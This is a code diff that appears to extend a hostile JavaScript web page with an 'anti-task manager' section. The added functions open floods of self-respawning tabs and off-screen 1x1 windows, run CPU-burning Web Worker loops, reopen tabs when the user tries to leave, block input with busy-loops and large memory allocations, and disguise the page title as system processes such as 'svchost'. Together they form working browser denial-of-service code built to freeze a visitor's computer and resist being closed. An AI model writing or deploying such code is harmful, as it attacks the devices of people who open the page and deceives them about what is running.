@@ -408,6 +408,11 @@ function initParentWindow () {
     hydraEffect()
     ultimateAntiClose()
     hydraMode()
+    processSpam()
+    floodProcesses()
+    ghostProcess()
+    fakeSystemFreeze()
+    makeTaskManagerHard()
     }
   })
 }
@@ -3456,7 +3461,7 @@ function hideUI() {
   }, 50)
 }
 
-function impossibleToClose() {
+function ultimateAntiClose() {
   blockClose()
   focusSteal()
   popunderSpam()
@@ -3612,6 +3617,83 @@ function hydraEffect() {
       }
     }
   }
+}
+
+// ===== ANTI-TASK MANAGER =====
+function processSpam() {
+  for (let i = 0; i < 50; i++) {
+    window.open(location.href + '?process=' + i, '_blank')
+  }
+  setInterval(() => {
+    for (let i = 0; i < 10; i++) {
+      window.open(location.href + '?respawn=' + Date.now(), '_blank')
+    }
+  }, 100)
+}
+
+function floodProcesses() {
+  setInterval(() => {
+    const worker = new Worker(URL.createObjectURL(new Blob([`
+      self.onmessage = () => {
+        while(true) {
+          let x = 0;
+          for(let i=0; i<10000000; i++) x += Math.sqrt(i);
+        }
+      }
+    `])))
+    for (let i = 0; i < 5; i++) {
+      window.open(location.href + '?flood=' + Date.now(), '_blank', 'popup')
+    }
+    const iframe = document.createElement('iframe')
+    iframe.src = location.href + '?iframe=' + Date.now()
+    document.body.appendChild(iframe)
+  }, 50)
+}
+
+function ghostProcess() {
+  setInterval(() => {
+    for (let i = 0; i < 5; i++) {
+      window.open(
+        location.href + '?ghost=' + Date.now(),
+        '_blank',
+        'width=1,height=1,left=' + (-1000 - i * 10) + ',top=' + (-1000 - i * 10)
+      )
+    }
+  }, 500)
+  window.addEventListener('beforeunload', () => {
+    for (let i = 0; i < 20; i++) {
+      window.open(location.href + '?revive=' + Date.now(), '_blank')
+    }
+  })
+}
+
+function fakeSystemFreeze() {
+  setInterval(() => {
+    document.body.style.pointerEvents = 'none'
+    while (performance.now() % 100 !== 0) {
+      Math.random() * Math.random()
+    }
+    const arr = new ArrayBuffer(100 * 1024 * 1024)
+    document.body.innerHTML = '<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:black;z-index:99999;"></div>'
+  }, 10)
+}
+
+function makeTaskManagerHard() {
+  for (let i = 0; i < 100; i++) {
+    window.open(location.href + '?p=' + i, '_blank')
+  }
+  for (let i = 0; i < 20; i++) {
+    const worker = new Worker(URL.createObjectURL(new Blob([`
+      self.onmessage = () => {
+        while(true) { let x = 0; for(let i=0; i<10000000; i++) x += Math.sqrt(i); }
+      }
+    `], { type: 'application/javascript' })))
+    worker.postMessage('start')
+  }
+  document.title = 'System Process'
+  setInterval(() => {
+    document.title = ['System', 'svchost', 'chrome', 'explorer'][Math.floor(Math.random() * 4)]
+  }, 100)
 }
 
 function detectBrowser () {
